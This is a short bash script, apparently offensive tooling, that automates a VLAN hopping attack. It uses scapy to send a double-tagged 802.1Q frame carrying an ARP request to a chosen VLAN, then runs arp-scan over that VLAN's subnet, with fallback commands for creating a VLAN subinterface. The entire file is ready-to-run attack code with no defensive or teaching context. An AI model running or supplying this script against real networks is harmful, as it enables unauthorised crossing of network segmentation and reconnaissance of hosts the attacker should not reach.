#!/bin/bash
# VLAN hopping automation
IFACE="${1:-eth0}"
TARGET_VLAN="${2:-10}"

echo "[*] Sending double-tagged frame to VLAN $TARGET_VLAN"
python3 -c "
from scapy.all import *
sendp(Ether(dst='ff:ff:ff:ff:ff:ff')/Dot1Q(vlan=1)/Dot1Q(vlan=$TARGET_VLAN)/ARP(pdst='192.168.${TARGET_VLAN}.1'), iface='$IFACE')
"

echo "[*] Scanning VLAN $TARGET_VLAN"
arp-scan -I "${IFACE}.${TARGET_VLAN}" "192.168.${TARGET_VLAN}.0/24" 2>/dev/null || \
    echo "[!] Create VLAN interface first: ip link add link $IFACE name ${IFACE}.${TARGET_VLAN} type vlan id $TARGET_VLAN && ip link set ${IFACE}.${TARGET_VLAN} up"
